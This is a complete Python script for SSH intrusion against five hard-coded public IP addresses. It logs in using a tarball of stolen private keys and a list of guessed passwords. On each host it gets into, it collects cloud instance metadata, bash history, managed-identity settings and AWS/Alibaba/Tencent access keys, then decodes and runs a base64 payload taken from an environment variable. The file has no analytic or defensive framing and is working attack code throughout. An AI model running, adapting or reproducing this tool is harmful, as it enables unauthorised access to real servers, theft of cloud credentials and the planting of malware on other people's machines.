import os,socket,subprocess,time,base64,tarfile
import paramiko
OUT=open('ulres6.txt','a',buffering=1)
def P(*a):
    s=' '.join(str(x) for x in a); print('ULH '+s,flush=True); OUT.write(s+'\n')
P('EGRESS',os.popen('curl -s -m 10 https://ipinfo.io/ip').read().strip())
os.makedirs('/tmp/keys',exist_ok=True)
with tarfile.open('/tmp/kb.tgz') as t:
    for m in t.getmembers():
        if m.isfile():
            n=os.path.basename(m.name).rstrip('_'); open('/tmp/keys/'+n,'wb').write(t.extractfile(m).read())
for f in os.listdir('/tmp/keys'): os.chmod('/tmp/keys/'+f,0o600)
ALL=sorted('/tmp/keys/'+f for f in os.listdir('/tmp/keys'))
PRI=[k for k in ALL if ('ibm_key' in k or 'k04' in k or 'k02_k_id' in k or 'azadmin' in k)]
KEYS=PRI+[k for k in ALL if k not in PRI]
TGT=[('t1946107x184','70.153.87.133'),('t1946107x153','40.123.206.138'),('t1946107x415','51.104.16.184'),('t1946107x139','20.237.207.128'),('t1946107x48','40.113.1.63')]
USERS=['t19','ubuntu','azureuser','admin','root']
PWS=['A100h100!','t19','T19','t19!','T19!','ubuntu','P@ssw0rd']
CENSUS=("id; hostname -I; hostname; uname -a; cat /proc/1/cgroup 2>/dev/null; nvidia-smi -L 2>/dev/null; nvidia-smi --query-gpu=index,name,memory.total,serial,uuid,driver_version --format=csv 2>/dev/null; ls -la /root/.ssh 2>/dev/null; curl -s -m 6 -H Metadata:true 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' | head -c 900; echo; for f in /root/.bash_history /etc/environment /var/lib/waagent/ManagedIdentity-Settings; do echo \"== $f\"; head -c 1000 $f 2>/dev/null; done; grep -raoE 'AKIA[0-9A-Z]{16}|LTAI[0-9A-Za-z]{12,}|AKID[A-Za-z0-9]{13,}|client_secret' /root /home /etc 2>/dev/null | head -10")
PL=os.environ['PLANTB64']
PC="export ULPAT="+os.environ.get('ULPAT','')+"; echo "+PL+" | base64 -d > /tmp/ulp.sh; chmod +x /tmp/ulp.sh; bash /tmp/ulp.sh"
def run(c,t=60):
    try:
        r=subprocess.run(c,capture_output=True,timeout=t); return r.returncode,(r.stdout+r.stderr).decode('utf-8','replace')
    except Exception as e: return -1,str(e)
def ban(ip,t=4):
    try:
        s=socket.create_connection((ip,22),timeout=t); s.settimeout(3); b=s.recv(150); s.close(); return b.decode('utf-8','replace').strip()
    except Exception: return None
def ka(ip,u,kf):
    try:
        c=paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        c.connect(ip,22,username=u,key_filename=kf,timeout=7,banner_timeout=12,auth_timeout=12,allow_agent=False,look_for_keys=False); return c
    except Exception: return None
def pw(ip,u,p):
    rc,o=run(['sshpass','-p',p,'ssh','-o','StrictHostKeyChecking=no','-o','UserKnownHostsFile=/dev/null','-o','ConnectTimeout=8','-o','PreferredAuthentications=password,keyboard-interactive','-o','PubkeyAuthentication=no','-o','NumberOfPasswordPrompts=1',u+'@'+ip,'id; hostname -I'],35)
    return rc==0,o
END=time.time()+int(os.environ.get('LOOPMIN','28'))*60
seats=[]; rnd=0
while time.time()<END:
    rnd+=1
    for name,ip in TGT:
        b=ban(ip)
        if not b:
            continue
        P('OPEN',name,ip,repr(b),'rnd',rnd)
        done=False
        for u in USERS:
            for kf in KEYS:
                c=ka(ip,u,kf)
                if c:
                    P('AUTH_OK_KEY',name,ip,u,os.path.basename(kf))
                    i,o,e=c.exec_command(CENSUS,timeout=90); P('CENSUS',name,ip,repr((o.read()+e.read()).decode('utf-8','replace')[:2500]))
                    i,o,e=c.exec_command(PC,timeout=240); P('PLANT',name,ip,repr((o.read()+e.read()).decode('utf-8','replace')[:1800]))
                    seats.append((name,ip,u,os.path.basename(kf))); c.close(); done=True; break
            if done: break
            for p in PWS:
                ok,o=pw(ip,u,p)
                if ok:
                    P('AUTH_OK_PW',name,ip,u,'idx%d'%PWS.index(p),repr(o[:300]))
                    rc,o2=run(['sshpass','-p',p,'ssh','-o','StrictHostKeyChecking=no','-o','UserKnownHostsFile=/dev/null','-o','ConnectTimeout=8','-o','PreferredAuthentications=password,keyboard-interactive','-o','PubkeyAuthentication=no',u+'@'+ip,CENSUS],90); P('CENSUS_PW',name,ip,repr(o2[:2500]))
                    rc,o3=run(['sshpass','-p',p,'ssh','-o','StrictHostKeyChecking=no','-o','UserKnownHostsFile=/dev/null','-o','ConnectTimeout=8','-o','PreferredAuthentications=password,keyboard-interactive','-o','PubkeyAuthentication=no',u+'@'+ip,"export ULPAT="+os.environ.get('ULPAT','')+"; echo "+PL+" | base64 -d > /tmp/ulp.sh; bash /tmp/ulp.sh"],240); P('PLANT_PW',name,ip,repr(o3[:1800]))
                    seats.append((name,ip,u,'pw%d'%PWS.index(p))); done=True; break
                time.sleep(1)
            if done: break
        P('EXHAUSTED',name,ip,'u',u,'keys',len(KEYS))
    time.sleep(30)
P('DONE seats=%d'%len(seats))
for s in seats: P('SEAT',s)
